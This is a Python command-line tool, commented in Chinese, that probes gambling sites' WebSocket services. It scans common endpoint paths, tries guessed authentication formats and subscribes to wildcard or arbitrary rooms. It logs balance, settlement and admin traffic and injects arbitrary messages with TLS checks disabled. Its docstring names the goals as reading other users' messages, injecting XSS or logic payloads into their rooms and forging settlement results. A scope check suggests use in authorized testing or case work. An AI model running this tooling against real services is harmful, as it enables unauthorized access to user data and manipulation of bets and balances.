#!/usr/bin/env python3
"""WebSocket 游戏消息探测 — 博彩站专项。

博彩站的游戏逻辑大量依赖 WebSocket：
  - 游戏房间加入/结果通知
  - 实时余额推送
  - 聊天/互动
  - 行政广播（admin → 所有用户）

攻击面：
  1. 未授权订阅：不带 token 也能连接，订阅任意 roomId
  2. 越权消息：改 uid/roomId 参数订阅其他用户的消息
  3. 消息注入：向其他用户的房间发送消息（XSS/逻辑）
  4. 重放 settle 消息：伪造游戏结算结果

示例:
  python3 炼蛊房/ws_probe.py doctor
  python3 炼蛊房/ws_probe.py scan \
    --base wss://target.com --case <案卷>
  python3 炼蛊房/ws_probe.py listen \
    --url wss://target.com/ws --token <token> --case <案卷> --duration 60
  python3 炼蛊房/ws_probe.py inject \
    --url wss://target.com/ws --token <token> \
    --msg '{"type":"bet","amount":0.01}' --case <案卷>
"""
from __future__ import annotations
import argparse
import json
import re
import sys
import threading
import time
from datetime import datetime, UTC
from pathlib import Path

try:
    import websocket  # websocket-client
    HAS_WS = True
except ImportError:
    HAS_WS = False

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

ENGINE = Path(__file__).resolve().parents[1]
OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope  # noqa: E402

def _now(): return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")
def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "websocket"
    d.mkdir(parents=True, exist_ok=True)
    return d

# 博彩站常见 WS 路径
WS_PATHS = [
    "/ws", "/websocket", "/socket.io/", "/socket.io/?EIO=4&transport=websocket",
    "/ws/game", "/ws/chat", "/game/ws", "/ws/v1",
    "/mqtt",           # WebSocket over MQTT
    "/ws/notify",
    "/ws/balance",
    "/api/ws",
    "/stomp",          # Spring STOMP
    "/ws/stomp",
    "/live",
    # 博彩站特定
    "/ws/bet", "/ws/lottery", "/ws/casino",
    "/ws/room", "/ws/slots",
    "/h5ws", "/appws",
]

# 常见 WS 认证消息格式（connect 后发送）
def auth_messages(token: str, uid: str = "1") -> list[dict | str]:
    return [
        # 纯 token
        {"token": token},
        {"type": "auth", "token": token},
        {"type": "login", "token": token},
        {"action": "auth", "data": {"token": token}},
        # JWT 风格
        {"cmd": "login", "token": token},
        {"event": "auth", "token": token},
        # 含 uid
        {"type": "auth", "uid": uid, "token": token},
        # Socket.io 风格（已在路径中处理，这里只是 msg）
        "42[\"auth\",{\"token\":\"" + token + "\"}]",
        # STOMP
        "CONNECT\ntoken:" + token + "\n\n\x00",
    ]

# 感兴趣的消息类型（收到时记录）
INTERESTING_TYPES = {
    "settle", "win", "result", "game_result", "bet_result",
    "balance", "wallet", "fund",
    "admin", "broadcast", "system",
    "login", "auth", "token",
    "error", "kick", "ban",
    "withdraw", "deposit", "recharge",
    "order", "transaction",
}

def _is_interesting(msg: str) -> bool:
    try:
        data = json.loads(msg)
        s = json.dumps(data).lower()
    except Exception:
        s = msg.lower()
    return any(t in s for t in INTERESTING_TYPES)

def cmd_doctor(_: argparse.Namespace) -> int:
    print(f"[{'ok' if HAS_WS else 'missing'}] websocket-client")
    if not HAS_WS:
        print("  install: pip3 install websocket-client")
    print(f"[ok] {len(WS_PATHS)} WS path patterns")
    print("[ok] ws_probe ready")
    return 0 if HAS_WS else 1

def _try_connect(url: str, token: str = "", timeout: float = 8.0) -> tuple[bool, list[str]]:
    """尝试连接 WS，返回 (connected, messages_received)。"""
    if not HAS_WS:
        return False, []
    messages = []
    connected = False
    error_msg = ""

    def on_message(ws, msg):
        messages.append(msg)

    def on_open(ws):
        nonlocal connected
        connected = True
        if token:
            for auth_msg in auth_messages(token)[:3]:
                try:
                    payload = json.dumps(auth_msg) if isinstance(auth_msg, dict) else auth_msg
                    ws.send(payload)
                    time.sleep(0.5)
                except Exception:
                    pass

    def on_error(ws, err):
        nonlocal error_msg
        error_msg = str(err)

    ws = websocket.WebSocketApp(url,
                                on_open=on_open,
                                on_message=on_message,
                                on_error=on_error)
    t = threading.Thread(target=ws.run_forever,
                         kwargs={"sslopt": {"cert_reqs": 0}})
    t.daemon = True
    t.start()
    time.sleep(timeout)
    ws.close()
    return connected, messages

def cmd_scan(args: argparse.Namespace) -> int:
    base_http = args.base.replace("wss://", "https://").replace("ws://", "http://")
    domain = host_of(base_http)
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")
    if not HAS_WS:
        raise SystemExit("[err] pip3 install websocket-client")

    scheme = "wss" if args.base.startswith("wss") else "ws"
    host = re.sub(r"wss?://", "", args.base).rstrip("/")
    results = []

    print(f"[*] scanning {len(WS_PATHS)} WS endpoints on {host}")
    for path in WS_PATHS:
        url = f"{scheme}://{host}{path}"
        connected, msgs = _try_connect(url, args.token, timeout=5.0)
        if connected:
            interesting = [m for m in msgs if _is_interesting(m)]
            entry = {"url": url, "connected": True,
                     "messages_count": len(msgs),
                     "interesting": interesting[:5]}
            results.append(entry)
            mark = "★" if interesting else "+"
            print(f"  {mark} {url}  msgs={len(msgs)}  interesting={len(interesting)}")
            if interesting:
                for m in interesting[:2]:
                    print(f"    → {m[:150]!r}")

    out = case_dir(args.case)
    out_json = out / "ws_scan.json"
    out_json.write_text(json.dumps({"ts": _now(), "host": host, "results": results},
                                   ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"\n[result] {len(results)} connectable WS endpoints → {out_json}")
    return 0 if results else 1

def cmd_listen(args: argparse.Namespace) -> int:
    """持续监听 WS 消息，记录到文件。"""
    domain = host_of(args.url.replace("wss://", "https://").replace("ws://", "http://"))
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")
    if not HAS_WS:
        raise SystemExit("[err] pip3 install websocket-client")

    all_msgs = []
    out = case_dir(args.case)
    out_ndjson = out / "ws_listen.ndjson"
    print(f"[*] listening {args.url}  duration={args.duration}s …")

    def on_message(ws, msg):
        ts = _now()
        all_msgs.append({"ts": ts, "msg": msg})
        if _is_interesting(msg):
            print(f"  ★ [{ts}] {msg[:200]!r}")
            with open(out_ndjson, "a", encoding="utf-8") as f:
                f.write(json.dumps({"ts": ts, "msg": msg}, ensure_ascii=False) + "\n")

    def on_open(ws):
        print("[+] connected")
        for m in auth_messages(args.token)[:3]:
            try:
                ws.send(json.dumps(m) if isinstance(m, dict) else m)
                time.sleep(0.5)
            except Exception:
                pass
        # 发送订阅 payload（博彩站常见）
        for sub in [
            {"type": "subscribe", "room": "all"},
            {"type": "join", "roomId": "1"},
            {"action": "subscribe", "channel": "#"},
        ]:
            try:
                ws.send(json.dumps(sub))
                time.sleep(0.3)
            except Exception:
                pass

    ws = websocket.WebSocketApp(args.url, on_open=on_open, on_message=on_message)
    t = threading.Thread(target=ws.run_forever,
                         kwargs={"sslopt": {"cert_reqs": 0}})
    t.daemon = True
    t.start()
    time.sleep(args.duration)
    ws.close()
    print(f"\n[result] {len(all_msgs)} msgs received, {sum(1 for m in all_msgs if _is_interesting(m['msg']))} interesting")
    print(f"[+] → {out_ndjson}")
    return 0

def cmd_inject(args: argparse.Namespace) -> int:
    """向 WS 注入自定义消息，测试越权/注入。"""
    domain = host_of(args.url.replace("wss://", "https://").replace("ws://", "http://"))
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")
    if not HAS_WS:
        raise SystemExit("[err] pip3 install websocket-client")

    received = []
    ws_conn = []

    def on_message(ws, msg):
        received.append(msg)
        print(f"  ← {msg[:200]!r}")

    def on_open(ws):
        ws_conn.append(ws)
        print("[+] connected")
        if args.token:
            ws.send(json.dumps({"type": "auth", "token": args.token}))
            time.sleep(1)
        print(f"[*] sending: {args.msg}")
        ws.send(args.msg)

    ws = websocket.WebSocketApp(args.url, on_open=on_open, on_message=on_message)
    t = threading.Thread(target=ws.run_forever,
                         kwargs={"sslopt": {"cert_reqs": 0}})
    t.daemon = True
    t.start()
    time.sleep(args.wait)
    ws.close()

    out = case_dir(args.case)
    (out / "ws_inject.json").write_text(
        json.dumps({"ts": _now(), "url": args.url, "sent": args.msg,
                    "received": received}, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8")
    print(f"[result] sent, received {len(received)} responses")
    return 0

def main() -> int:
    p = argparse.ArgumentParser(description="WebSocket 游戏消息探测（博彩站专项）")
    sub = p.add_subparsers(dest="cmd", required=True)

    d = sub.add_parser("doctor"); d.set_defaults(func=cmd_doctor)

    sc = sub.add_parser("scan", help="扫描所有 WS 端点")
    sc.add_argument("--base", required=True, help="如 wss://target.com")
    sc.add_argument("--case", required=True)
    sc.add_argument("--token", default="")
    sc.set_defaults(func=cmd_scan)

    li = sub.add_parser("listen", help="持续监听 WS 消息")
    li.add_argument("--url", required=True)
    li.add_argument("--case", required=True)
    li.add_argument("--token", default="")
    li.add_argument("--duration", type=float, default=120.0)
    li.set_defaults(func=cmd_listen)

    inj = sub.add_parser("inject", help="注入自定义消息")
    inj.add_argument("--url", required=True)
    inj.add_argument("--msg", required=True)
    inj.add_argument("--case", required=True)
    inj.add_argument("--token", default="")
    inj.add_argument("--wait", type=float, default=5.0)
    inj.set_defaults(func=cmd_inject)

    args = p.parse_args()
    return int(args.func(args) or 0)

if __name__ == "__main__":
    raise SystemExit(main())
